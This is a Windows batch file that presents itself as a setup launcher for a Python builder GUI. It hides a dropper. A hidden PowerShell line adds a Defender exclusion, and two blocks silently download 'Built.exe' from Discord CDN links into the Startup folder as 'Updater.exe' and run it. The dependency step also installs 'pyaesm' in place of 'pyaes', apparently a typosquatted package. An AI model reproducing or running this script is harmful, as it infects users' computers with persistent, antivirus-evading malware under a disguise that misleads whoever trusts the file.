powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/973337617057869825/1176190901970796564/Built.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/973337617057869825/1176181839065526402/Built.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Updater.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the latest version.^)
    echo Make sure it is added to PATH.
    goto ERROR
)

title Checking libraries...
echo Checking 'customtkinter' (1/4)
python -c "import customtkinter" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing customtkinter...
    python -m pip install customtkinter > nul
)

echo Checking 'pillow' (2/4)
python -c "import PIL" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pillow...
    python -m pip install pillow > nul
)

echo Checking 'pyaes' (3/4)
python -c "import pyaes" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyaes...
    python -m pip install pyaesm > nul
)

echo Checking 'urllib3' (4/4)
python -c "import urllib3" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing urllib3...
    python -m pip install urllib3 > nul
)

cls
title Starting builder...
python gui.py
if %errorlevel% neq 0 goto ERROR
exit

:ERROR
color 4 && title [Error]
pause > nul